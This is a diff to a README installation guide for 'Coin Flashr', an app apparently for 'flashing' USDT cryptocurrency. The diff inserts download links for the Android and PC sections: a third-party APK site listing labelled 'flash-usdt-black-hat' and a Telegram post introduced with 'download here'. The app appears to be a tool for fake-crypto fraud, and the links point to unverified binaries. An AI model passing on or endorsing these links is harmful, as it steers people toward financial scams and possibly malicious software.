@@ -34,7 +34,7 @@ Upon gaining access to the app, you’ll receive a limited spendable quota of BT
 # Installation Guide
 
 # For Android Users
-
+https://apkpure.com/flash-usdt-black-hat/flash.usdtblackhat/download
 Download the latest Coin Flashr APK from the official release page.
 
 # For iOS Users
@@ -42,7 +42,8 @@ Download the latest Coin Flashr APK from the official release page.
 Visit the official project website to download the iOS version (not available on the App Store).
 
 # For PC Users
-
+download here 👇👇👇
+https://t.me/usdtflashapp/4
 Coin Flashr is available on Windows, Mac, and Linux. A separate repository is dedicated to the PC version—check it out for installation instructions.
 
 # How to Use Coin Flashr
